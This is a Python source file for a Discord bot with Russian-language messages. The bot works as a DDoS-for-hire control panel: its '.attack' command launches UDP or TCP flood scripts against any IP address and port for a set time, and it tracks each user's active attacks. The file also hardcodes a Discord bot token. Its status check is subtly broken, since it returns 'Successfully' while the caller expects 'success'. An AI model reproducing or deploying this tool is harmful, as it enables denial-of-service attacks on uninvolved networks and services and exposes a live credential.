import discord
from discord.ext import commands, tasks
import socket
import asyncio
import os
import subprocess
import sys

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=".", intents=intents, help_command=None)

active_attacks = {}
ip_blacklist = set()

def load_ip_blacklist():
    if os.path.exists("IPban.txt"):
        with open("IPban.txt", "r") as file:
            for line in file:
                ip_blacklist.add(line.strip())
load_ip_blacklist()

@bot.command()
async def help(ctx):
    embed = discord.Embed(title="Помощь", description=".help - Показать список доступных команд.\n.methods - Узнать о методах атак.", color=discord.Color.red())
    await ctx.reply(embed=embed)

@bot.command()
async def methods(ctx):
    embed = discord.Embed(title="Методы атак:", description="L4 методы:\n- udp\n- tcp", color=discord.Color.purple())
    await ctx.reply(embed=embed)

@bot.command()
async def attack(ctx, ip: str = None, port: int = None, seconds: int = None, method: str = 'udp'):
    if ip is None or port is None or seconds is None:
        embed = discord.Embed(title="Ошибка", description="Правильная команда: .attack (айпи) (порт) (секунды) (метод)", color=discord.Color.red())
        await ctx.reply(embed=embed)
        return

    if ip in ip_blacklist:
        embed = discord.Embed(title="Ошибка", description="Этот айпи/домен/сайт находится в BlackList.", color=discord.Color.red())
        await ctx.reply(embed=embed)
        return

    if not is_valid_ip(ip):
        embed = discord.Embed(title="Ошибка", description="Неправильный айпи. Убедитесь, что он корректный.", color=discord.Color.red())
        await ctx.reply(embed=embed)
        return

    if not (0 < port < 65536):
        embed = discord.Embed(title="Ошибка", description="Неправильный порт. Порт должен быть в диапазоне от 1 до 65535.", color=discord.Color.red())
        await ctx.reply(embed=embed)
        return

    if seconds is None or seconds <= 0 or not isinstance(seconds, int):
        embed = discord.Embed(title="Ошибка", description="Вы написали не правильно секунды. Должно быть положительное целое число.", color=discord.Color.red())
        await ctx.reply(embed=embed)
        return

    if method.lower() not in ['udp', 'tcp']:
        embed = discord.Embed(title="Ошибка", description="Вы написали неправильный метод атаки, напишите .methods для просмотра методов.", color=discord.Color.red())
        await ctx.reply(embed=embed)
        return

    api_status = await check_api_status(ip, port, method)
    if api_status != 'success':
        embed = discord.Embed(
            title="Ошибка API",
            description=f"🌐 | Айпи: {ip}\n⚓ | Порт: {port}\n⏳ | Секунды атаки: {seconds}\n📚 | Метод: {method.upper()}\n\nСтатус API:\nFurySquadApi: :x: {api_status}",
            color=discord.Color.red()
        )
        await ctx.reply(embed=embed)
        return

    attack_id = f"{ctx.author.id}_{len(active_attacks) + 1}"
    active_attacks[attack_id] = {'ip': ip, 'port': port, 'seconds': seconds, 'method': method}

    embed = discord.Embed(
        title="Атака запущена",
        description=f"🌐 | Айпи: {ip}\n⚓ | Порт: {port}\n⏳ | Секунды атаки: {seconds}\n📚 | Метод: {method.upper()}",
        color=discord.Color.purple()
    )
    msg = await ctx.reply(embed=embed)

    await run_attack(ip, port, seconds, attack_id, method, ctx)

@bot.command()
async def activeattacks(ctx):
    embed = discord.Embed(title="Активные атаки:", color=discord.Color.purple())

    if not active_attacks:
        embed.description = "Нет активных атак."
        await ctx.reply(embed=embed)
        return

    for attack_id, attack in list(active_attacks.items()):
        user = await bot.fetch_user(int(attack_id.split('_')[0]))
        if attack['seconds'] > 0:
            embed.add_field(
                name=f"Игрок: {user.name} (ID: {user.id})",
                value=f"Метод: {attack['method'].upper()}\nОсталось секунд: {attack['seconds']}",
                inline=False
            )
        else:
            del active_attacks[attack_id]

    await ctx.reply(embed=embed)

@tasks.loop(seconds=1)
async def update_active_attacks():
    for attack_id in list(active_attacks.keys()):
        active_attacks[attack_id]['seconds'] -= 1
        if active_attacks[attack_id]['seconds'] <= 0:
            del active_attacks[attack_id]

@bot.event
async def on_ready():
    update_active_attacks.start()

def is_valid_ip(ip):
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    for part in parts:
        if not part.isdigit() or not (0 <= int(part) < 256):
            return False
    return True

async def run_attack(ip, port, seconds, attack_id, method, ctx):
    try:
        process = await asyncio.create_subprocess_exec(
            sys.executable, f'methods/l4/{method}.py', ip, str(port), str(seconds),
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )

        embed = discord.Embed(
            title="Атака запущена",
            description=(f"🌐 | Айпи: {ip}\n⚓ | Порт: {port}\n⏳ | Секунды атаки: {seconds}\n📚 | Метод: {method.upper()}"),
            color=discord.Color.purple()
        )

        await ctx.send(embed=embed)

        print(f"[INFO] Атака на {ip}:{port} запущена на {seconds} секунд(ы) с методом {method.upper()}.")

        stdout, stderr = await process.communicate()
        if stdout:
            print(f"Вывод: {stdout.decode()}")
        if stderr:
            error_message = stderr.decode()
            await ctx.send(f":x: Ошибка: {error_message}")
    except Exception as e:
        await ctx.send(f":x: Ошибка: {e}")
        print(f"[ERROR] Ошибка запуска атаки: {e}")

async def check_api_status(ip, port, method):
    try:
        sock = socket.create_connection((ip, port), timeout=5)
        sock.close()
        
        return 'Successfully'

    except Exception as e:
        return f"{str(e)}"

bot.run("MTI4MjEwMDI2MTc0NTIwMTE2Mw.GXsdyS.1z8vE1iTufXiZB9JU-JZ8f2G9qRg_AQ8DM9Q-U")